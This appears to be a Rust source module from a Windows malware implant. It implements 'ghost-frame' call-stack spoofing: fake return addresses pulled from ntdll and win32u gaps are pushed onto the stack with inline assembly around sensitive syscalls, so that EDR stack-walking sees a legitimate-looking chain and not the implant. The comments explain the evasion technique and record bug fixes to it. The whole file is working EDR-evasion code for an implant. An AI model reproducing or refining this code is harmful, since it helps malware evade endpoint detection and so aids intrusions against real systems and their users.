//! LACUNA ghost-frame stack injection — BYOUD-Gap leaf frame spoofing.
//!
//! Injects ghost return addresses onto the stack before sensitive syscalls
//! so that EDR call-stack sampling (via RtlVirtualUnwind / ETW STACKWALK)
//! sees a chain of .pdata lacuna addresses instead of the implant's real
//! call chain. Each ghost address, when processed by the unwinder, returns
//! NULL from RtlLookupFunctionEntry → treated as leaf frame → RSP += 8.
//!
//! ## How it works
//! Before a syscall:
//!   [real return addr]     ← what EDR would normally see
//!   [ghost_frame_N]        ← fake (win32u NOP gap)
//!   ...
//!   [ghost_frame_0]        ← fake (ntdll exception anchor)
//!   [syscall return addr]  ← real, points back to implant
//!   ─── RSP ───
//!
//! After the syscall returns, the ghost frames are popped off the stack
//! and execution continues normally. The ghost frames are ONLY present
//! during the syscall window when EDR might sample the stack.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use crate::lacuna::GhostChain;
use core::arch::asm;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

/// Hard cap on the number of ghost frames with_ghost_stack will push. Bounds
/// the `frames_len * 8` byte count used in the `add rsp, pop_bytes` epilogue so
/// a corrupted/huge CHAIN_LEN can't overflow that multiply and corrupt RSP.
/// 32 frames = 256 B of stack — far more than any realistic EDR stack-walk
/// depth (typically the first few frames decide "legit"). Also bounds the
/// static buffer install_ghost_chain leaks. Closes CRITICAL-9 (overflow half).
const MAX_GHOST_DEPTH: usize = 32;

/// Cached ghost chain built at bootstrap. `0` = not yet scanned.
static CHAIN_FRAMES: AtomicUsize = AtomicUsize::new(0);
static CHAIN_LEN: AtomicUsize = AtomicUsize::new(0);
static CHAIN_READY: AtomicBool = AtomicBool::new(false);

/// Install a ghost chain for stack injection. Called at bootstrap after
/// LACUNA scanning. `frames` is leaked into a static — lives for the
/// process lifetime (implant never tears down).
pub fn install_ghost_chain(chain: &GhostChain) {
    if chain.frames.is_empty() {
        return;
    }
    let len = chain.frames.len();
    // Bound the depth we ever install: protects the frames_len * 8 multiply in
    // with_ghost_stack from overflow on a corrupted/huge chain, and caps the
    // process-lifetime leak. MAX_GHOST_DEPTH = 32.
    let len = if len > MAX_GHOST_DEPTH { MAX_GHOST_DEPTH } else { len };
    let src_slice: &[usize] = &chain.frames[..len];

    // Allocate a static buffer for the frames. The previous code did
    // `Vec::with_capacity(len)` then `as_ptr() as *mut` then `forget(v)` then
    // `from_raw_parts_mut(ptr, len)` then `copy_from_slice` — but
    // with_capacity leaves len slots UNINITIALIZED, so from_raw_parts_mut
    // reinterpreted them as initialized = UB, and under OOM (capacity 0,
    // dangling ptr) it was instant UB. We instead initialize the slots FIRST
    // (extend_from_slice writes len items, setting v.len == len) and only then
    // detach the buffer from the Vec via forget. We also re-check capacity +
    // length after the extend to defend against a degenerate allocator.
    let buf: &'static mut [usize] = {
        let mut v: Vec<usize> = Vec::with_capacity(len);
        v.extend_from_slice(src_slice);
        // extend_from_slice guarantees v.len() == src_slice.len() == len on
        // success; if the allocator failed to grow, Vec's grow path aborts
        // (panic = "abort" here), so we never observe a short write. Defense
        // in depth: still assert before taking the pointer.
        if v.capacity() < len || v.len() != len {
            // Allocation did not satisfy the request — bail without arming the
            // chain; with_ghost_stack will degrade to a direct f() call.
            return;
        }
        let ptr = v.as_mut_ptr();
        // SAFETY: v now holds exactly `len` initialized usize slots laid out
        // contiguously at `ptr`. We transfer ownership to the static slice and
        // forget the Vec so its destructor does not free the backing store
        // (the slice now owns it for the process lifetime — the implant never
        // tears down, matching the leak pattern of GLOBAL_GAP_POOL in
        // stack.rs). Because the slots were written BEFORE forget, the slice
        // observes only initialized memory — no UB.
        let slab = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
        core::mem::forget(v);
        slab
    };
    // Defensive: slab already initialized by extend_from_slice above; this
    // copy is a no-op overlay guaranteeing the content matches src_slice even
    // if a future refactor changes the construction path.
    buf.copy_from_slice(src_slice);
    CHAIN_FRAMES.store(buf.as_ptr() as usize, Ordering::Release);
    CHAIN_LEN.store(len, Ordering::Release);
    CHAIN_READY.store(true, Ordering::Release);
}

/// Execute `closure` with ghost frames injected onto the stack.
/// While `closure` runs, EDR stack sampling will see the ghost chain
/// instead of the real call stack.
///
/// # Safety
/// `closure` must not unwind (panic/exception) while ghost frames are
/// on the stack — the stack would be corrupted.
///
/// This function uses inline assembly to push ghost frames, call the
/// closure, then pop them. No heap allocation, no function pointers
/// through CFG — direct stack manipulation via `asm!`.
#[inline(never)]
pub unsafe fn with_ghost_stack<F: FnOnce()>(f: F) {
    if !CHAIN_READY.load(Ordering::Acquire) {
        f();
        return;
    }

    let frames_ptr = CHAIN_FRAMES.load(Ordering::Acquire) as *const usize;
    let frames_len_raw = CHAIN_LEN.load(Ordering::Acquire);

    if frames_ptr.is_null() || frames_len_raw == 0 {
        f();
        return;
    }

    // Clamp the effective depth to MAX_GHOST_DEPTH. install_ghost_chain
    // already caps the stored length at 32, so for any chain installed by the
    // fixed code this is a no-op; the clamp exists so a stale/legacy chain (or
    // a corrupted CHAIN_LEN) cannot drive the push loop and the pop-byte
    // multiply out of sync. Keeps push count == pop bytes/8 == frames_len.
    let frames_len = if frames_len_raw > MAX_GHOST_DEPTH {
        MAX_GHOST_DEPTH
    } else {
        frames_len_raw
    };

    // Push ghost frames in reverse order onto the stack.
    // The unwinder walks from low to high addresses, so the FIRST
    // ghost it encounters should be the last one we push.
    for i in (0..frames_len).rev() {
        let addr = core::ptr::read(frames_ptr.add(i));
        asm!(
            "push {}",
            in(reg) addr,
        );
    }

    // Execute the closure. During its execution, the stack has ghost
    // frames between the closure's frame and the caller's frame.
    f();

    // Pop ghost frames off the stack (restore RSP). Each frame is 8 bytes on
    // x64. checked_mul so the byte count cannot overflow into a wild
    // `add rsp, imm` that would corrupt RSP (CRITICAL-9 overflow half).
    // frames_len is clamped to MAX_GHOST_DEPTH above, so this is always
    // Some(<=256); the checked_mul is retained as explicit overflow defense.
    let pop_bytes = match frames_len.checked_mul(8) {
        Some(b) => b,
        None => return, // unreachable under MAX_GHOST_DEPTH clamp; degrade.
    };
    asm!(
        "add rsp, {}",
        in(reg) pop_bytes,
    );
}
